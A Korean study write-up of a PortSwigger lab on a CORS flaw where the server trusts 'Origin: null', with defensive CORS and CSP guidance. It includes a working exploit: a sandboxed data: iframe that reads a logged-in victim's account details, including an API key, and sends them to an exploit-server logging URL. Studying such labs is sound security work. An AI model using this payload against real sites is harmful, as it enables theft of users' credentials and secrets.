# Lab: CORS vulnerability with trusted null origin

## 개요

- **난이도**: Apprentice
- **주제**: CORS — `null` Origin 화이트리스트 / sandbox iframe / `Origin: null` 생성
- **링크**: https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack

## 목표

서버가 `Origin: null` 을 신뢰하도록 설정된 취약점을 이용한다. `sandbox` 속성이 있는 iframe 은 `Origin: null` 을 생성하므로, exploit 페이지에 sandboxed iframe 을 삽입해 피해자의 자격증명으로 admin API 를 호출하고 API 키를 탈취한다.

## 001 랩과의 차이

```
[001 랩 — Origin 무조건 반영]
  서버가 어떤 Origin 이든 그대로 반영
  → Access-Control-Allow-Origin: <요청한 Origin>
  → 일반 fetch() 로 공격 가능

[002 랩 (이번) — null Origin 화이트리스트]
  서버가 특정 출처만 허용 (일반 출처 반영 X)
  → 하지만 Origin: null 을 신뢰 목록에 추가
  → null 을 생성할 수 있는 sandboxed iframe 이 필요
```

## `Origin: null` 이 발생하는 경우

```
브라우저가 Origin 헤더를 null 로 설정하는 상황:

1. sandbox 속성 iframe (allow-same-origin 없음)
   <iframe sandbox="allow-scripts" src="...">
   → iframe 내부 JS 의 출처가 null 로 처리

2. data: URL
   <iframe src="data:text/html,<script>...</script>">
   → 출처가 불투명(opaque) → null

3. file:// 프로토콜
   로컬 파일 실행 시 Origin: null

4. 일부 리다이렉트 시나리오
   크로스 오리진 리다이렉트 후 출처가 null 이 될 수 있음
```

## sandbox 속성 이해

### sandbox 속성 기본 동작

```html
<!-- sandbox 없음: 모든 권한 허용 -->
<iframe src="..."></iframe>

<!-- sandbox 만 있음: 모든 기능 차단 -->
<iframe sandbox src="..."></iframe>
<!-- JS 실행 불가, 폼 제출 불가, 탐색 불가, 쿠키 없음 -->

<!-- 개별 권한 명시적 허용 -->
<iframe sandbox="allow-scripts allow-top-navigation" src="...">
```

### 주요 sandbox 옵션

```
allow-scripts
  → JS 실행 허용
  → 이번 공격에서 fetch/XHR 실행을 위해 필요

allow-top-navigation
  → 최상위 프레임(주소창) URL 변경 허용
  → location = 'https://exploit-server/log?key=...' 로 이동하기 위해 필요

allow-forms
  → 폼 제출 허용

allow-same-origin
  → iframe 에 실제 출처(동일 출처) 부여
  → 이 옵션이 있으면 Origin: null 이 아닌 실제 출처 사용
  → null 공격에서는 사용하면 안 됨

allow-popups
  → window.open() 허용

allow-modals
  → alert(), confirm() 허용
```

### `allow-same-origin` 을 쓰면 안 되는 이유

```
sandbox="allow-scripts allow-same-origin" 인 경우:
  → iframe 이 실제 출처를 가짐 (exploit-server.net)
  → Origin: https://exploit-server.net 으로 전송
  → 서버의 null 화이트리스트 우회 불가

sandbox="allow-scripts" (allow-same-origin 없음):
  → iframe 출처가 불투명(opaque) → null
  → Origin: null 로 전송
  → 서버의 null 화이트리스트 통과!
```

## 취약한 서버 동작

```
요청:
  GET /accountDetails HTTP/1.1
  Origin: null
  Cookie: session=abc123

응답:
  Access-Control-Allow-Origin: null    ← null 을 신뢰!
  Access-Control-Allow-Credentials: true
  Content-Type: application/json

  {"username":"admin","apiKey":"secret123"}
```

```
서버 설정의 의도 (잘못된 가정):
  null 은 로컬 개발 환경 (file://) 을 의미
  → 개발자 편의를 위해 허용
  → 실제로는 sandbox iframe 도 null 을 생성 → 위험
```

## 공격 방법

### exploit 페이지 코드

```html
<iframe
  sandbox="allow-scripts allow-top-navigation"
  src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
      location = 'https://exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
    };
    req.open('GET', 'https://VULNERABLE.com/accountDetails', true);
    req.withCredentials = true;
    req.send();
  </script>"
></iframe>
```

### 공격 구조 분석

```
<iframe sandbox="allow-scripts allow-top-navigation">

  sandbox:
    → allow-same-origin 없음 → iframe 출처 = null
    → 내부 JS 의 Origin 헤더 = null

  allow-scripts:
    → iframe 내부 JS (fetch/XHR) 실행 허용

  allow-top-navigation:
    → 탈취한 데이터를 location = 'exploit-server/log?key=...' 로 전송
    → 최상위 프레임 주소 변경 허용 → exploit 서버로 이동

  src="data:text/html,...":
    → HTML/JS 를 data: URL 로 직접 삽입
    → 별도 서버 불필요 (data: 도 출처가 null)
```

### 실행 흐름

```
1. 공격자: exploit 페이지에 sandboxed iframe 삽입

2. 피해자: exploit 페이지 방문
   (VULNERABLE.com 에 로그인된 상태)

3. iframe 로드:
   sandbox → allow-same-origin 없음 → 출처 null
   data: URL → 출처 null

4. iframe 내부 JS 실행:
   XHR 요청:
     GET /accountDetails
     Origin: null            ← sandboxed iframe 이 자동 설정
     Cookie: session=<피해자 세션>

5. VULNERABLE.com 서버:
   Origin: null → 화이트리스트 확인 → null 허용!
   Access-Control-Allow-Origin: null
   Access-Control-Allow-Credentials: true
   응답: {"apiKey":"secret123"}

6. 브라우저: CORS 허가 확인 → JS 응답 접근 허용

7. location = 'https://exploit-server.net/log?key=...'
   allow-top-navigation → 이동 허용 → 탈취 완료
```

## sandbox 옵션 탐지 및 방어

### 공격자 관점에서 탐지 필요한 옵션

```
서버/WAF 가 탐지해야 할 패턴:

Origin: null 헤더 자체를 신뢰하지 않음
  → 서버에서 null 을 화이트리스트에서 제거

CSP(Content-Security-Policy) 로 iframe sandbox 제어:
  frame-ancestors 'self'
  → 외부 출처에서 이 사이트를 iframe 으로 삽입 불가
  (공격자 페이지가 VULNERABLE.com 을 iframe 에 넣는 것 차단)

X-Frame-Options: SAMEORIGIN / DENY
  → Clickjacking 방어와 동일한 원리
  → 외부 출처가 이 사이트를 iframe 에 삽입 불가
```

### iframe sandbox 속성 탐지 관점

```
방어자가 검토해야 할 것:

1. 자사 서비스에서 Origin: null 을 허용하는가?
   → CORS 설정 감사: null 을 화이트리스트에서 제거

2. 외부 콘텐츠를 iframe 에 삽입할 때 sandbox 옵션 최소화:
   취약한 패턴:
     sandbox="allow-scripts allow-same-origin allow-top-navigation"
     → allow-same-origin: 실제 출처 허용 (CSRF 가능)
     → allow-top-navigation: 외부 페이지로 이동 가능

   최소 권한 원칙:
     sandbox="allow-scripts"
     → 필요한 것만 허용

3. CSP 로 data: URL iframe 차단:
   Content-Security-Policy: frame-src 'self' https://trusted.com
   → data: URL iframe 차단 → null Origin 생성 제한
```

### 서버 측 방어

```javascript
// 취약한 CORS 설정 (null 허용)
const allowedOrigins = ['https://trusted.com', 'null'];  // ← 위험!

// 안전한 설정 (null 제거)
const allowedOrigins = ['https://trusted.com'];

app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (allowedOrigins.includes(origin)) {
        res.setHeader('Access-Control-Allow-Origin', origin);
        res.setHeader('Access-Control-Allow-Credentials', 'true');
    }
    // null 은 화이트리스트에 없으므로 허용 안 됨
    next();
});
```

## 핵심 정리

- `sandbox` 속성(without `allow-same-origin`)이 있는 iframe 은 `Origin: null` 을 생성한다.
- 서버가 `null` 을 신뢰하면, sandboxed iframe 안에서 피해자의 자격증명으로 인증된 응답을 읽을 수 있다.
- `allow-scripts` 는 XHR/fetch 실행, `allow-top-navigation` 은 탈취 데이터를 외부 서버로 전송하기 위한 리다이렉트에 필요하다.
- **방어**:
  - CORS 화이트리스트에서 `null` 출처 제거
  - `frame-src` CSP 로 `data:` URL iframe 차단
  - 내부 서비스에서 `Origin: null` 요청은 항상 거부

## 배운 점 및 추가 학습

### 1. sandbox 속성 조합별 동작 비교

```html
<!-- 모든 기능 차단 -->
<iframe sandbox src="...">
  → JS 없음, 쿠키 없음, 탐색 없음, 출처 null

<!-- JS 만 허용 -->
<iframe sandbox="allow-scripts" src="...">
  → JS 실행 O, 출처 null, 탐색 X
  → fetch/XHR 가능, 결과 전송 불가 (location 변경 불가)

<!-- JS + 탐색 허용 (이번 랩) -->
<iframe sandbox="allow-scripts allow-top-navigation" src="...">
  → JS 실행 O, 출처 null, 최상위 탐색 O
  → fetch/XHR + location 변경으로 데이터 탈취 가능

<!-- JS + 같은 출처 허용 (allow-same-origin 추가) -->
<iframe sandbox="allow-scripts allow-same-origin" src="...">
  → JS 실행 O, 출처 = 실제 origin (null 아님)
  → null 공격 불가, but CSRF 공격 가능성 있음
```

### 2. data: URL 과 null Origin

```javascript
// data: URL 예시
const htmlContent = '<script>alert(origin)</script>';
const dataUrl = 'data:text/html,' + encodeURIComponent(htmlContent);

// data: URL 을 iframe src 로 사용하면:
// → 출처가 불투명(opaque) → Origin: null 생성
// → 서버가 null 을 허용하면 인증된 요청 가능

// blob: URL 도 동일
const blob = new Blob([htmlContent], {type: 'text/html'});
const blobUrl = URL.createObjectURL(blob);
// → 같은 출처의 blob은 출처를 유지하지만
//   크로스 오리진 컨텍스트에서는 null 이 될 수 있음
```

### 3. CSP 로 iframe 제어

```
Content-Security-Policy: frame-src 'self' https://trusted.com
  → 이 페이지가 iframe 에 삽입할 수 있는 출처 제한
  → data: URL iframe 차단
  → 공격자 페이지의 sandboxed iframe 에서 data: URL 사용 불가

frame-ancestors 'self'
  → 이 페이지를 iframe 으로 감쌀 수 있는 출처 제한
  → 공격자가 VULNERABLE.com 자체를 iframe 에 넣는 것 차단
  (Clickjacking 방어와 동일)

X-Content-Type-Options: nosniff
  → MIME 타입 스니핑 방지 (data: URL 콘텐츠 타입 오용 차단)
```

### 4. 001 랩 vs 002 랩 종합 비교

| 항목 | 001 (Origin 반영) | 002 (null 화이트리스트) |
|------|-------------------|------------------------|
| 서버 취약점 | Origin 헤더 무조건 반영 | null 을 신뢰 목록에 추가 |
| 공격 기법 | 일반 fetch() | sandboxed iframe |
| Origin 헤더 | 공격자 도메인 | null |
| 추가 조건 | 없음 | `allow-scripts` + `allow-top-navigation` |
| 발생 원인 | 잘못된 CORS 구현 | 개발 편의를 위한 null 허용 |
